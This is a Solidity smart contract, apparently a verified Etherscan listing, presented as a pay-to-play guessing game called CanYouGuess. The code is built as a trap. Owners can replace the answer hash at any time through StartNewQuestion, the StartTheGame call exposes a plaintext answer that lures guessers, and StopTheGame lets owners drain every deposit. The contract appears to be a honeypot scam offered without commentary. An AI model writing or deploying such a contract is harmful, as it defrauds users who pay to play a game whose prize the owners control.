/**
 *Submitted for verification at Etherscan.io on 2022-08-04
*/

contract CanYouGuess
{
    function Try(string memory my_answer) public payable
    {
        require(msg.sender == tx.origin);
        if(msg.value > 1 wei && correct_answer == keccak256(abi.encode(my_answer)))
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;
    bytes32 correct_answer=0x0;

    mapping (bytes32=>bool) owners;


    function StartTheGame(string calldata _question, string calldata _answer) public payable isOwner{
        if(correct_answer==0x0){
            correct_answer = keccak256(abi.encode(_answer));
            question = _question;
        }
    }

    function StartNewQuestion(string calldata _question, bytes32 _answer) public payable isOwner {
        question = _question;
        correct_answer = _answer;
    }

    function StopTheGame() public payable isOwner {
        payable(msg.sender).transfer(address(this).balance);
    }


    constructor(bytes32[] memory owner) {
        for(uint256 i=0; i < owner.length; i++){
            owners[owner[i]] = true;
        }
    }

    modifier isOwner(){
        require(owners[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    fallback() external {}
}